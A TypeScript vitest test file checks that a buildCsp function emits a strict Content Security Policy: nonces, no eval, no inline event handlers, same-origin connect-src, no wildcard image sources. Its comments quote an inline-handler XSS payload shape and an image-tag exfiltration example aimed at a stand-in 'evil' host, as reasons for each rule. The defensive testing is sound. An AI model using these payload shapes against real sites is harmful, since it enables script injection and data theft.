import { describe, it, expect } from 'vitest';
import { buildCsp } from './csp';

/**
 * PRD §9.13 requires a real CSP on rendered pages, and its absence "produces no
 * error and fails no test" — which is exactly why these exist. The v1.2
 * changelog records CSP being wrongly attributed to Helmet, so this layer has
 * already been got wrong once.
 */
describe('buildCsp (production)', () => {
  const csp = buildCsp('TESTNONCE', false);

  it('carries the request nonce on scripts and styles', () => {
    expect(csp).toContain("script-src 'self' 'nonce-TESTNONCE' 'strict-dynamic'");
    expect(csp).toContain("style-src 'self' 'nonce-TESTNONCE'");
  });

  it('never permits eval or inline script in production', () => {
    // The dev policy needs both for HMR. Shipping the dev branch would silently
    // delete the layer this file exists to provide.
    expect(csp).not.toContain('unsafe-eval');
    expect(csp).not.toMatch(/script-src[^;]*'unsafe-inline'/);
  });

  it('blocks inline event handlers', () => {
    // <img src=x onerror=...> is the payload shape a poisoned PDF yields, and
    // this kills it even if the sanitiser is misconfigured.
    expect(csp).toContain("script-src-attr 'none'");
  });

  it('allows inline style ATTRIBUTES, which Radix positioning requires', () => {
    // Popover/Dropdown/Dialog/Tooltip write inline style="" for positioning and
    // attributes cannot carry a nonce. Omit this and every dropdown renders at 0,0.
    expect(csp).toContain("style-src-attr 'unsafe-inline'");
  });

  it('keeps connect-src same-origin', () => {
    // The payoff of the same-site topology (§11.9): the API is reached through
    // the Next rewrite, so this never widens. It doubles as a tripwire — point
    // the client at the Express origin directly and the app breaks loudly.
    expect(csp).toContain("connect-src 'self'");
    expect(csp).not.toContain('connect-src *');
  });

  it('permits blob: for images and workers, but never a wildcard https:', () => {
    // blob: is needed because authenticated documents are fetched and drawn,
    // not embedded. A bare https: would let document-derived markup exfiltrate
    // via <img src="https://evil/?d=...">.
    expect(csp).toContain("img-src 'self' blob: data:");
    expect(csp).toContain("worker-src 'self' blob:");
    expect(csp).not.toMatch(/img-src[^;]*https:/);
  });

  it('locks down framing, plugins and base URI', () => {
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toContain("object-src 'none'");
    // An injected <base href> silently repoints every relative URL on the page.
    expect(csp).toContain("base-uri 'none'");
    expect(csp).toContain("form-action 'self'");
  });

  it('upgrades insecure requests', () => {
    expect(csp).toContain('upgrade-insecure-requests');
  });
});

/**
 * CSP3: a nonce and `'unsafe-inline'` are mutually exclusive. Once a nonce is
 * present the browser IGNORES `'unsafe-inline'` completely. Listing both yields
 * a header that READS as permissive and BEHAVES as strict — which is how the
 * dev policy silently blocked the dev server's own <style> elements while
 * appearing to allow them. Neither environment may ever list both together.
 */
describe('nonce and unsafe-inline are never combined in one directive', () => {
  for (const [label, isDev] of [['production', false], ['development', true]] as const) {
    it(`holds for ${label}`, () => {
      const csp = buildCsp('TESTNONCE', isDev);
      for (const directive of csp.split(';').map((d) => d.trim())) {
        if (!directive.includes("'unsafe-inline'")) continue;
        expect(
          directive.includes('nonce-'),
          `"${directive}" lists both a nonce and 'unsafe-inline'; the browser will ignore 'unsafe-inline'`,
        ).toBe(false);
      }
    });
  }
});

describe('buildCsp (development)', () => {
  const csp = buildCsp('TESTNONCE', true);

  it('permits what the dev server needs, and only in dev', () => {
    expect(csp).toContain('unsafe-eval');
    expect(csp).toContain('ws:');
  });

  it('actually allows inline styles, rather than only appearing to', () => {
    // Next injects its own <style> elements in development without our nonce,
    // so dev drops the nonce from style-src for 'unsafe-inline' to take effect.
    expect(csp).toMatch(/style-src [^;]*'unsafe-inline'/);
    expect(csp).not.toMatch(/style-src [^;]*nonce-/);
  });

  it('still blocks inline event handlers and framing', () => {
    expect(csp).toContain("script-src-attr 'none'");
    expect(csp).toContain("frame-ancestors 'none'");
  });
});
